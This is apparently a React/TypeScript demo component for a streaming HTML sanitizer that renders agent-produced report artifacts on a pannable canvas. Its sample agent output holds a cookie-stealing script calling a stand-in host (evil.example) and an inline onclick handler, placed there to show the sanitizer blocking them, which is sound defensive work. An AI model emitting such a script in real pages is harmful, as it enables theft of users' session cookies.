import {
  createCamera,
  panCamera,
  SceneStore,
  screenToWorld,
  StreamCoalescer,
  StreamingIngestion,
  VisibilityTracker,
  worldToScreen,
  worldViewport,
  zoomCameraAt,
  type ArtifactHandle,
  type Camera,
} from "@dopejs/deckle";
import type { ArtifactFrame } from "@dopejs/deckle-protocol";
import { StreamingSanitizer } from "@dopejs/deckle-security";
import { useEffect, useRef, useState, type ReactNode } from "react";

export const DEMO_AGENT_OUTPUT =
  '<section class="report">' +
  "<h2>Q3 revenue</h2>" +
  "<p>Revenue reached <strong>$4.2M</strong>, up 12% quarter over quarter.</p>" +
  "<ul><li>Subscriptions: $3.1M</li><li>Services: $1.1M</li></ul>" +
  '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>' +
  "<table><tr><th>Segment</th><th>Growth</th></tr>" +
  "<tr><td>Enterprise</td><td>18%</td></tr><tr><td>Self-serve</td><td>7%</td></tr></table>" +
  '<p onclick="alert(1)">Full breakdown in the appendix.</p>' +
  "</section>";

const WIDTH = 960;
const HEIGHT = 560;

interface CanvasArtifact {
  readonly id: string;
  readonly title: string;
  readonly kind: "brief" | "report" | "chart" | "notes";
  readonly hue: number;
  readonly frame: ArtifactFrame;
}

const CANVAS_ARTIFACTS: readonly CanvasArtifact[] = [
  {
    id: "campaign-brief",
    title: "Campaign brief",
    kind: "brief",
    hue: 44,
    frame: { x: -650, y: -310, width: 270, height: 190, zIndex: 1 },
  },
  {
    id: "agent-report",
    title: "agent-report.html",
    kind: "report",
    hue: 220,
    frame: { x: -330, y: -225, width: 620, height: 450, zIndex: 5 },
  },
  {
    id: "revenue-chart",
    title: "Revenue chart",
    kind: "chart",
    hue: 148,
    frame: { x: 350, y: -290, width: 330, height: 220, zIndex: 2 },
  },
  {
    id: "appendix-notes",
    title: "Appendix notes",
    kind: "notes",
    hue: 292,
    frame: { x: 390, y: 5, width: 290, height: 205, zIndex: 3 },
  },
];

export function tokenizeDemoStream(text: string): string[] {
  const chunks: string[] = [];
  let index = 0;
  let step = 3;
  while (index < text.length) {
    chunks.push(text.slice(index, index + step));
    index += step;
    step = (step % 7) + 2;
  }
  return chunks;
}

interface StreamingSession {
  readonly store: SceneStore;
  readonly handle: ArtifactHandle;
  readonly sanitizer: StreamingSanitizer;
  readonly ingestion: StreamingIngestion;
  readonly chunks: readonly string[];
  cursor: number;
  clock: number;
  html: string;
}

interface StreamingView {
  readonly source: string;
  readonly safeLength: number;
  readonly html: string;
  readonly lifecycle: string;
  readonly pins: string;
  readonly pending: string;
  readonly sourceRevision: number;
  readonly draftRevision: number;
  readonly paintRevision: number;
  readonly diagnostics: number;
  readonly complete: boolean;
}

interface StreamingCanvasMetrics {
  readonly zoom: number;
  readonly visible: number;
  readonly selected: string;
  readonly drawMs: number;
}

const EMPTY_VIEW: StreamingView = {
  source: "",
  safeLength: 0,
  html: "",
  lifecycle: "loading",
  pins: "loading",
  pending: "—",
  sourceRevision: 0,
  draftRevision: 0,
  paintRevision: 0,
  diagnostics: 0,
  complete: false,
};

const INITIAL_CANVAS_METRICS: StreamingCanvasMetrics = {
  zoom: 0.78,
  visible: 0,
  selected: "agent-report",
  drawMs: 0,
};

export interface StreamingDemoLabels {
  readonly play: string;
  readonly pause: string;
  readonly step: string;
  readonly reset: string;
  readonly speed: string;
}

function newSession(): StreamingSession {
  const store = new SceneStore();
  let handle: ArtifactHandle | undefined;
  store.transact((transaction) => {
    for (const artifact of CANVAS_ARTIFACTS) {
      const created = transaction.createArtifact(artifact.id, artifact.frame);
      if (artifact.kind === "report") {
        handle = created;
        continue;
      }
      transaction.transition(created, "parsed");
      transaction.transition(created, "snapshot");
      transaction.commitPaint(created, 1, 1);
    }
  });
  if (handle === undefined) throw new Error("streaming demo artifact is missing");

  const sanitizer = new StreamingSanitizer();
  return {
    store,
    handle,
    sanitizer,
    ingestion: new StreamingIngestion(
      store,
      handle,
      sanitizer,
      new StreamCoalescer({ minIntervalMs: 40, minChars: 48 }),
    ),
    chunks: tokenizeDemoStream(DEMO_AGENT_OUTPUT),
    cursor: 0,
    clock: 0,
    html: "",
  };
}

function viewOf(session: StreamingSession): StreamingView {
  const update = session.sanitizer.current;
  const record = session.store.get(session.handle);
  return {
    source: session.sanitizer.source,
    safeLength: update.safeLength,
    html: session.html,
    lifecycle: record.lifecycle,
    pins: record.pins.join(", ") || "none",
    pending: update.pending ?? "—",
    sourceRevision: record.revisions.sourceRevision,
    draftRevision: record.revisions.draftRevision,
    paintRevision: record.revisions.paintRevision || record.revisions.provisionalPaintRevision,
    diagnostics: update.diagnostics.length,
    complete: session.ingestion.settled,
  };
}

function canvasPoint(canvas: HTMLCanvasElement, event: PointerEvent | WheelEvent) {
  const bounds = canvas.getBoundingClientRect();
  return {
    x: ((event.clientX - bounds.left) / bounds.width) * WIDTH,
    y: ((event.clientY - bounds.top) / bounds.height) * HEIGHT,
  };
}

function drawGrid(context: CanvasRenderingContext2D, camera: Camera, dark: boolean): void {
  context.fillStyle = dark ? "#0d131e" : "#f6f7f9";
  context.fillRect(0, 0, WIDTH, HEIGHT);
  const viewport = worldViewport(camera);
  const gridStep = 80;
  const startX = Math.floor(viewport.x / gridStep) * gridStep;
  const startY = Math.floor(viewport.y / gridStep) * gridStep;
  context.strokeStyle = dark ? "#202b3a" : "#e1e5eb";
  context.lineWidth = 1;
  for (let x = startX; x <= viewport.x + viewport.width; x += gridStep) {
    const screen = worldToScreen(camera, { x, y: 0 });
    context.beginPath();
    context.moveTo(Math.round(screen.x) + 0.5, 0);
    context.lineTo(Math.round(screen.x) + 0.5, HEIGHT);
    context.stroke();
  }
  for (let y = startY; y <= viewport.y + viewport.height; y += gridStep) {
    const screen = worldToScreen(camera, { x: 0, y });
    context.beginPath();
    context.moveTo(0, Math.round(screen.y) + 0.5);
    context.lineTo(WIDTH, Math.round(screen.y) + 0.5);
    context.stroke();
  }
}

function drawContextArtifact(
  context: CanvasRenderingContext2D,
  artifact: CanvasArtifact,
  camera: Camera,
  dark: boolean,
  selected: boolean,
): void {
  const topLeft = worldToScreen(camera, artifact.frame);
  const width = artifact.frame.width * camera.zoom;
  const height = artifact.frame.height * camera.zoom;
  const radius = 8 * Math.min(camera.zoom, 1);
  context.fillStyle = dark ? "#171e29" : "#ffffff";
  context.strokeStyle = selected
    ? dark
      ? "#8eb0ff"
      : "#1e66f5"
    : dark
      ? `hsl(${String(artifact.hue)} 30% 35%)`
      : `hsl(${String(artifact.hue)} 30% 70%)`;
  context.lineWidth = selected ? 3 : 1;
  context.beginPath();
  context.roundRect(topLeft.x, topLeft.y, width, height, radius);
  context.fill();
  context.stroke();

  context.save();
  context.beginPath();
  context.roundRect(topLeft.x, topLeft.y, width, height, radius);
  context.clip();
  context.fillStyle = dark
    ? `hsl(${String(artifact.hue)} 32% 19%)`
    : `hsl(${String(artifact.hue)} 55% 94%)`;
  context.fillRect(topLeft.x, topLeft.y, width, 30 * camera.zoom);
  context.fillStyle = dark ? "#dfe6f0" : "#27313e";
  context.font = `${String(12 * Math.min(camera.zoom, 1.1))}px ui-monospace, monospace`;
  context.fillText(
    artifact.title,
    topLeft.x + 11 * camera.zoom,
    topLeft.y + 20 * camera.zoom,
    width - 22 * camera.zoom,
  );

  if (artifact.kind === "chart") {
    const bars = [0.42, 0.68, 0.54, 0.86];
    bars.forEach((bar, index) => {
      const barWidth = 35 * camera.zoom;
      const barHeight = bar * 115 * camera.zoom;
      context.fillStyle = `hsl(${String(artifact.hue)} 55% ${dark ? "48%" : "60%"})`;
      context.fillRect(
        topLeft.x + (28 + index * 55) * camera.zoom,
        topLeft.y + height - 20 * camera.zoom - barHeight,
        barWidth,
        barHeight,
      );
    });
  } else {
    const lines = artifact.kind === "brief" ? [0.78, 0.92, 0.64, 0.84] : [0.9, 0.72, 0.86, 0.58];
    lines.forEach((line, index) => {
      context.fillStyle = dark ? "#334052" : "#dce2e9";
      context.fillRect(
        topLeft.x + 16 * camera.zoom,
        topLeft.y + (52 + index * 25) * camera.zoom,
        (artifact.frame.width - 32) * line * camera.zoom,
        8 * camera.zoom,
      );
    });
  }
  context.restore();
}

function drawReportArtifact(
  context: CanvasRenderingContext2D,
  artifact: CanvasArtifact,
  camera: Camera,
  view: StreamingView,
  dark: boolean,
  selected: boolean,
): void {
  const topLeft = worldToScreen(camera, artifact.frame);
  const width = artifact.frame.width * camera.zoom;
  const height = artifact.frame.height * camera.zoom;
  const scale = camera.zoom;
  const streaming = !view.complete;
  const radius = 10 * Math.min(scale, 1);
  const frame = new Path2D();
  frame.roundRect(topLeft.x, topLeft.y, width, height, radius);

  context.fillStyle = dark ? "#171d28" : "#ffffff";
  context.fill(frame);
  context.save();
  context.clip(frame);
  context.fillStyle = dark ? "#111722" : "#f0f4fb";
  context.fillRect(topLeft.x, topLeft.y, width, 42 * scale);
  context.fillStyle = dark ? "#dfe7f4" : "#202a38";
  context.font = `${String(13 * Math.min(scale, 1.15))}px ui-monospace, monospace`;
  context.fillText(artifact.title, topLeft.x + 18 * scale, topLeft.y + 26 * scale);

  const status = view.complete ? "COMMITTED" : view.lifecycle.toLocaleUpperCase();
  const statusWidth = context.measureText(status).width + 16 * scale;
  context.fillStyle = view.complete ? (dark ? "#163a2a" : "#dff5e8") : dark ? "#1c3157" : "#dfe9ff";
  context.beginPath();
  context.roundRect(
    topLeft.x + width - statusWidth - 14 * scale,
    topLeft.y + 10 * scale,
    statusWidth,
    22 * scale,
    11 * scale,
  );
  context.fill();
  context.fillStyle = view.complete ? "#48b979" : dark ? "#8eb0ff" : "#1e66f5";
  context.fillText(status, topLeft.x + width - statusWidth - 6 * scale, topLeft.y + 26 * scale);

  context.beginPath();
  context.rect(topLeft.x, topLeft.y + 42 * scale, width, height - 42 * scale);
  context.clip();
  const contentX = topLeft.x + 30 * scale;
  let contentY = topLeft.y + 86 * scale;
  const safeHtml = view.html;

  if (!safeHtml.includes("Q3 revenue")) {
    for (const line of [0.54, 0.82, 0.7]) {
      context.fillStyle = dark ? "#2a3443" : "#e6eaf0";
      context.fillRect(contentX, contentY, (artifact.frame.width - 60) * line * scale, 10 * scale);
      contentY += 27 * scale;
    }
  } else {
    context.fillStyle = dark ? "#f0f4fa" : "#1e2733";
    context.font = `700 ${String(28 * Math.min(scale, 1.1))}px system-ui, sans-serif`;
    context.fillText("Q3 revenue", contentX, contentY);
    contentY += 40 * scale;
  }

  context.font = `${String(14 * Math.min(scale, 1.1))}px system-ui, sans-serif`;
  if (safeHtml.includes("Revenue reached")) {
    context.fillStyle = dark ? "#b9c3d1" : "#4e5a69";
    context.fillText("Revenue reached", contentX, contentY);
    context.fillStyle = dark ? "#8eb0ff" : "#1e66f5";
    context.font = `700 ${String(22 * Math.min(scale, 1.1))}px system-ui, sans-serif`;
    context.fillText("$4.2M", contentX + 125 * scale, contentY);
    context.font = `${String(14 * Math.min(scale, 1.1))}px system-ui, sans-serif`;
    context.fillStyle = dark ? "#b9c3d1" : "#4e5a69";
    context.fillText("+12% QoQ", contentX + 215 * scale, contentY);
    contentY += 40 * scale;
  }

  for (const [needle, text] of [
    ["Subscriptions", "Subscriptions     $3.1M"],
    ["Services", "Services              $1.1M"],
  ] as const) {
    if (!safeHtml.includes(needle)) continue;
    context.fillStyle = dark ? "#b9c3d1" : "#4e5a69";
    context.fillText(`•  ${text}`, contentX, contentY);
    contentY += 26 * scale;
  }

  if (safeHtml.includes("Enterprise")) {
    contentY += 6 * scale;
    context.fillStyle = dark ? "#263245" : "#edf1f6";
    context.fillRect(contentX, contentY, (artifact.frame.width - 60) * scale, 30 * scale);
    context.fillStyle = dark ? "#dce4ef" : "#27313e";
    context.font = `600 ${String(13 * Math.min(scale, 1.1))}px ui-monospace, monospace`;
    context.fillText("SEGMENT", contentX + 10 * scale, contentY + 20 * scale);
    context.fillText("GROWTH", contentX + 390 * scale, contentY + 20 * scale);
    contentY += 50 * scale;
    context.font = `${String(14 * Math.min(scale, 1.1))}px system-ui, sans-serif`;
    context.fillText("Enterprise", contentX + 10 * scale, contentY);
    context.fillStyle = "#48b979";
    context.fillText("18%", contentX + 405 * scale, contentY);
    contentY += 28 * scale;
  }
  if (safeHtml.includes("Self-serve")) {
    context.fillStyle = dark ? "#dce4ef" : "#27313e";
    context.fillText("Self-serve", contentX + 10 * scale, contentY);
    context.fillStyle = "#48b979";
    context.fillText("7%", contentX + 405 * scale, contentY);
    contentY += 34 * scale;
  }
  if (safeHtml.includes("Full breakdown")) {
    context.fillStyle = dark ? "#9ba8b8" : "#687485";
    context.fillText("Full breakdown in the appendix.", contentX, contentY);
  }

  const progress =
    DEMO_AGENT_OUTPUT.length === 0 ? 1 : view.source.length / DEMO_AGENT_OUTPUT.length;
  context.fillStyle = dark ? "#273243" : "#e2e7ee";
  context.fillRect(topLeft.x, topLeft.y + height - 5 * scale, width, 5 * scale);
  context.fillStyle = view.complete ? "#48b979" : dark ? "#7ca2ff" : "#1e66f5";
  context.fillRect(topLeft.x, topLeft.y + height - 5 * scale, width * progress, 5 * scale);
  context.restore();

  context.strokeStyle = selected
    ? dark
      ? "#8eb0ff"
      : "#1e66f5"
    : streaming
      ? dark
        ? "#7ca2ff"
        : "#1e66f5"
      : dark
        ? "#3b4758"
        : "#b9c1cc";
  context.lineWidth = selected ? 3 : 2;
  if (streaming) context.setLineDash([7, 5]);
  context.stroke(frame);
  context.setLineDash([]);

  if (streaming && view.pending !== "—") {
    const tag = `WITHHELD · ${view.pending}`;
    context.font = `${String(11 * Math.min(scale, 1.1))}px ui-monospace, monospace`;
    const tagWidth = context.measureText(tag).width + 18 * scale;
    context.fillStyle = dark ? "#4b341b" : "#fff0d8";
    context.beginPath();
    context.roundRect(
      topLeft.x + width - tagWidth - 12 * scale,
      topLeft.y + height + 10 * scale,
      tagWidth,
      25 * scale,
      5 * scale,
    );
    context.fill();
    context.fillStyle = dark ? "#ffc477" : "#9b5b00";
    context.fillText(
      tag,
      topLeft.x + width - tagWidth - 3 * scale,
      topLeft.y + height + 27 * scale,
    );
  }
}

export function StreamingDemo({ labels }: { readonly labels: StreamingDemoLabels }): ReactNode {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const sessionRef = useRef<StreamingSession | null>(null);
  const viewRef = useRef<StreamingView>(EMPTY_VIEW);
  const canvasRuntimeRef = useRef<{ redraw: () => void; reset: () => void } | null>(null);
  const timerRef = useRef<number | null>(null);
  const speedRef = useRef(28);
  const [view, setView] = useState<StreamingView>(EMPTY_VIEW);
  const [metrics, setMetrics] = useState<StreamingCanvasMetrics>(INITIAL_CANVAS_METRICS);
  const [playing, setPlaying] = useState(false);
  const [speed, setSpeed] = useState(28);

  const publish = (session: StreamingSession): void => {
    const next = viewOf(session);
    viewRef.current = next;
    setView(next);
    canvasRuntimeRef.current?.redraw();
  };

  const stop = (): void => {
    if (timerRef.current !== null) {
      window.clearInterval(timerRef.current);
      timerRef.current = null;
    }
    setPlaying(false);
  };

  const reset = (): void => {
    stop();
    const session = newSession();
    sessionRef.current = session;
    publish(session);
    canvasRuntimeRef.current?.reset();
  };

  const advance = (): boolean => {
    const session = sessionRef.current;
    if (session === null) return false;
    if (session.cursor >= session.chunks.length) {
      if (!session.ingestion.settled) {
        const result = session.ingestion.finish();
        session.html = result.html;
        publish(session);
      }
      return false;
    }

    session.clock += speedRef.current || 1;
    const result = session.ingestion.push(session.chunks[session.cursor]!, session.clock);
    session.cursor += 1;
    if (result.rendered) session.html = result.html;
    publish(session);
    return true;
  };

  const start = (): void => {
    if (timerRef.current !== null) return;
    setPlaying(true);
    timerRef.current = window.setInterval(
      () => {
        if (advance()) return;
        stop();
      },
      Math.max(8, speedRef.current),
    );
  };

  useEffect(() => {
    const canvas = canvasRef.current;
    const context = canvas?.getContext("2d");
    if (canvas === null || context === null || context === undefined) return;

    const dpr = Math.max(1, Math.min(3, globalThis.devicePixelRatio || 1));
    canvas.width = Math.round(WIDTH * dpr);
    canvas.height = Math.round(HEIGHT * dpr);
    const tracker = new VisibilityTracker();
    let camera = createCamera({
      x: 15,
      y: 0,
      zoom: INITIAL_CANVAS_METRICS.zoom,
      viewportWidth: WIDTH,
      viewportHeight: HEIGHT,
    });
    let selectedId: string | null = "agent-report";
    let dragging = false;
    let moved = false;
    let lastPoint = { x: 0, y: 0 };

    const draw = (): void => {
      const session = sessionRef.current;
      if (session === null) return;
      const started = performance.now();
      const dark = document.documentElement.dataset.theme === "dark";
      const sets = tracker.compute(session.store, camera);
      const visible = new Set(sets.visible);
      context.setTransform(dpr, 0, 0, dpr, 0, 0);
      context.clearRect(0, 0, WIDTH, HEIGHT);
      drawGrid(context, camera, dark);

      const drawable = CANVAS_ARTIFACTS.filter((artifact) => visible.has(artifact.id)).toSorted(
        (a, b) => a.frame.zIndex - b.frame.zIndex,
      );
      for (const artifact of drawable) {
        if (artifact.kind === "report") {
          drawReportArtifact(
            context,
            artifact,
            camera,
            viewRef.current,
            dark,
            selectedId === artifact.id,
          );
        } else {
          drawContextArtifact(context, artifact, camera, dark, selectedId === artifact.id);
        }
      }

      setMetrics({
        zoom: camera.zoom,
        visible: sets.visible.length,
        selected: selectedId ?? "—",
        drawMs: performance.now() - started,
      });
    };

    const resetCamera = (): void => {
      camera = createCamera({
        x: 15,
        y: 0,
        zoom: INITIAL_CANVAS_METRICS.zoom,
        viewportWidth: WIDTH,
        viewportHeight: HEIGHT,
      });
      selectedId = "agent-report";
      draw();
    };
    canvasRuntimeRef.current = { redraw: draw, reset: resetCamera };

    const pointerDown = (event: PointerEvent): void => {
      dragging = true;
      moved = false;
      lastPoint = canvasPoint(canvas, event);
      canvas.setPointerCapture(event.pointerId);
      canvas.classList.add("is-dragging");
    };
    const pointerMove = (event: PointerEvent): void => {
      if (!dragging) return;
      const point = canvasPoint(canvas, event);
      const dx = point.x - lastPoint.x;
      const dy = point.y - lastPoint.y;
      if (Math.abs(dx) + Math.abs(dy) > 2) moved = true;
      camera = panCamera(camera, -dx, -dy);
      lastPoint = point;
      draw();
    };
    const pointerUp = (event: PointerEvent): void => {
      dragging = false;
      canvas.classList.remove("is-dragging");
      if (moved) return;
      const point = canvasPoint(canvas, event);
      const world = screenToWorld(camera, point);
      selectedId =
        sessionRef.current?.store.queryPoint(world.x, world.y).toSorted((a, b) => {
          const first = CANVAS_ARTIFACTS.find((artifact) => artifact.id === a)?.frame.zIndex ?? 0;
          const second = CANVAS_ARTIFACTS.find((artifact) => artifact.id === b)?.frame.zIndex ?? 0;
          return second - first;
        })[0] ?? null;
      draw();
    };
    const pointerCancel = (): void => {
      dragging = false;
      canvas.classList.remove("is-dragging");
    };
    const wheel = (event: WheelEvent): void => {
      event.preventDefault();
      const point = canvasPoint(canvas, event);
      if (event.ctrlKey || event.metaKey) {
        const factor = Math.exp(-Math.max(-64, Math.min(64, event.deltaY)) * 0.01);
        camera = zoomCameraAt(camera, point, factor);
      } else {
        camera = panCamera(camera, event.deltaX, event.deltaY);
      }
      draw();
    };
    const themeObserver = new MutationObserver(draw);
    themeObserver.observe(document.documentElement, {
      attributes: true,
      attributeFilter: ["data-theme"],
    });
    canvas.addEventListener("pointerdown", pointerDown);
    canvas.addEventListener("pointermove", pointerMove);
    canvas.addEventListener("pointerup", pointerUp);
    canvas.addEventListener("pointercancel", pointerCancel);
    canvas.addEventListener("wheel", wheel, { passive: false });
    draw();

    return () => {
      canvasRuntimeRef.current = null;
      themeObserver.disconnect();
      canvas.removeEventListener("pointerdown", pointerDown);
      canvas.removeEventListener("pointermove", pointerMove);
      canvas.removeEventListener("pointerup", pointerUp);
      canvas.removeEventListener("pointercancel", pointerCancel);
      canvas.removeEventListener("wheel", wheel);
    };
  }, []);

  useEffect(() => {
    const session = newSession();
    sessionRef.current = session;
    publish(session);
    return () => {
      if (timerRef.current !== null) window.clearInterval(timerRef.current);
    };
  }, []);

  return (
    <div className="demo-stage demo-stage--streaming">
      <div className="demo-controls demo-controls--streaming">
        <button
          type="button"
          disabled={view.complete}
          onClick={() => {
            if (playing) stop();
            else start();
          }}
        >
          {playing ? labels.pause : labels.play}
        </button>
        <button
          type="button"
          disabled={view.complete}
          onClick={() => {
            stop();
            advance();
          }}
        >
          {labels.step}
        </button>
        <button type="button" onClick={reset}>
          {labels.reset}
        </button>
        <label>
          <span>{labels.speed}</span>
          <input
            type="range"
            min="8"
            max="100"
            value={speed}
            onChange={(event) => {
              const next = Number(event.currentTarget.value);
              speedRef.current = next;
              setSpeed(next);
              if (timerRef.current !== null) {
                stop();
                start();
              }
            }}
          />
          <output>{speed} ms</output>
        </label>
      </div>

      <div className="stream-canvas-shell">
        <canvas
          ref={canvasRef}
          className="demo-canvas stream-canvas"
          dir="ltr"
          aria-label="Streaming artifacts on an interactive infinite canvas"
        />
        <dl className="demo-hud demo-hud--streaming" aria-live="polite">
          <div>
            <dt>lifecycle / pins</dt>
            <dd>
              {view.lifecycle} / {view.pins}
            </dd>
          </div>
          <div>
            <dt>received / safe</dt>
            <dd>
              {view.source.length} / {view.safeLength}
            </dd>
          </div>
          <div>
            <dt>source / draft / paint</dt>
            <dd>
              {view.sourceRevision} / {view.draftRevision} / {view.paintRevision}
            </dd>
          </div>
          <div>
            <dt>zoom / visible / draw</dt>
            <dd>
              {metrics.zoom.toFixed(2)} / {metrics.visible} / {metrics.drawMs.toFixed(2)} ms
            </dd>
          </div>
        </dl>
        <div className="stream-canvas__status" aria-live="polite">
          <span>{metrics.selected}</span>
          <span>{view.diagnostics} blocked</span>
          <span>{view.pending === "—" ? "safe boundary decided" : view.pending}</span>
        </div>
      </div>
    </div>
  );
}
